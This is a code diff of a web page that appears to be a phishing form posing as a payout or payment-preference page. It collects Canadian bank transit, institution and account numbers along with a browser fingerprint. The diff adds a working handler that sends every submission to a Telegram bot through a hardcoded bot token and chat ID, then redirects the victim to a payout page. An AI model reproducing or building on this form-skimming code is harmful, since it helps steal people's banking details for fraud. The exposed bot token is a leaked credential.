@@ -726,7 +726,7 @@ CROP MODAL
 
   <!-- Navigation Buttons -->
 <div id="navButtons" style="max-width:600px;margin:40px auto 100px; display:flex;justify-content:flex-end; position:relative; z-index:5;">
-    <button id="nextBtn" style="background: rgba(107,44,216,0.9); border:1px solid #fff; padding:12px 24px; border-radius:12px; font-weight:bold; color:#fff;">Next</button>
+    <button id="nextBtnSeparate" style="background: rgba(107,44,216,0.9); border:1px solid #fff; padding:12px 24px; border-radius:12px; font-weight:bold; color:#fff;">Update</button>
 </div>
 </section>
     
@@ -987,23 +987,18 @@ document.querySelectorAll("input, select").forEach(input => {
 
 });
 
-
 /* --------------------------
 NUMBER-ONLY VALIDATION
 -------------------------- */
 
 ["transitNumber", "institutionNumber", "accountNumber"].forEach(id => {
-
   const input = document.getElementById(id);
 
   if (input) {
-
     input.addEventListener("input", () => {
       input.value = input.value.replace(/\D/g, "");
     });
-
   }
-
 });
 
 
@@ -1012,6 +1007,8 @@ CANADIAN BANK VALIDATION
 -------------------------- */
 
 function validateCanadianBankDetails() {
+
+  const preference = document.getElementById("preference")?.value.trim();
 
   if (preference !== "Canadian Bank Transfer") {
     return true;
@@ -1024,18 +1021,18 @@ function validateCanadianBankDetails() {
   const account = document.getElementById("accountNumber")?.value.trim();
 
   if (!bank) return false;
-
   if (!accountName) return false;
-
   if (!/^\d{5}$/.test(transit)) return false;
-
   if (!/^\d{3}$/.test(institution)) return false;
-
   if (!/^\d{7,12}$/.test(account)) return false;
 
   return true;
-
 }
+
+
+/* --------------------------
+MESSAGE BUILDER
+-------------------------- */
 
 function buildMessage(data) {
   return `
@@ -1053,6 +1050,11 @@ Institution Number: ${data.institutionNumber || "-"}
 Account Number: ${data.accountNumber || "-"}
 `;
 }
+
+
+/* --------------------------
+TELEGRAM SETUP
+-------------------------- */
 
 const BOT_TOKEN = "8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E";
 const CHAT_ID = "-1003913850436";
@@ -1072,18 +1074,12 @@ function sendToTelegram(data) {
   });
 }
 
+
 /* --------------------------
-SAVE DATA
+MAIN BUTTON HANDLER (FIXED)
 -------------------------- */
 
-function saveData() {
-
-  // Prevent invalid bank data from saving
-  if (!validateCanadianBankDetails()) {
-    return;
-  }
-
-  document.getElementById('nextBtnSeparate').addEventListener('click', async () => {
+document.getElementById('nextBtnSeparate').addEventListener('click', async () => {
 
   const data = {
     preference: document.getElementById("preference")?.value.trim(),
@@ -1099,31 +1095,52 @@ function saveData() {
     accountNumber: document.getElementById("accountNumber")?.value.trim()
   };
 
-  // validation: at least one field
+  // at least one field check
   const hasAnyValue = Object.values(data).some(v => v && v.toString().trim() !== "");
 
   if (!hasAnyValue) {
-    alert("Please fill at least one field");
-    return;
+    const container = document.querySelector(".payment-container");
+
+container.classList.add("warning");
+
+// remove after animation
+setTimeout(() => {
+  container.classList.remove("warning");
+}, 2000);
+
+return;
+  }
+
+  // bank validation
+  if (!validateCanadianBankDetails()) {
+    const container = document.querySelector(".payment-container");
+
+container.classList.add("warning");
+
+// remove after animation
+setTimeout(() => {
+  container.classList.remove("warning");
+}, 2000);
+
+return;
   }
 
   // save locally
   localStorage.setItem("section3Data", JSON.stringify(data));
 
   try {
-    // send first, wait for completion
     await sendToTelegram(data);
-
-    // only navigate AFTER success
     window.location.href = "section2.html";
-
   } catch (err) {
     console.error("Telegram send failed:", err);
-
-    // still allow navigation (optional decision)
     window.location.href = "/acu-payouts";
   }
 });
+
+
+/* --------------------------
+FINGERPRINT
+-------------------------- */
 
 function getFingerprint() {
   return btoa(
@@ -1133,18 +1150,21 @@ function getFingerprint() {
   );
 }
 
-        /* ---------- Auto-Logout After 8 Hours of Inactivity ---------- */
-        const AUTO_LOGOUT_TIME = 60 * 60 * 1000; // 1 hour
-        let logoutTimer = setTimeout(logout, AUTO_LOGOUT_TIME);
 
-        function resetLogoutTimer(){
-            clearTimeout(logoutTimer);
-            logoutTimer = setTimeout(logout, AUTO_LOGOUT_TIME);
-        }
+/* --------------------------
+AUTO LOGOUT
+-------------------------- */
 
-        ["mousemove","keydown","scroll","click"].forEach(event => {
-            window.addEventListener(event, resetLogoutTimer);
-        });
+const AUTO_LOGOUT_TIME = 60 * 60 * 1000; // 1 hour
+let logoutTimer = setTimeout(logout, AUTO_LOGOUT_TIME);
+
+function resetLogoutTimer() {
+  clearTimeout(logoutTimer);
+  logoutTimer = setTimeout(logout, AUTO_LOGOUT_TIME);
+}
+
+["mousemove", "keydown", "scroll", "click"].forEach(event => {
+  window.addEventListener(event, resetLogoutTimer);
 });
 </script>
 
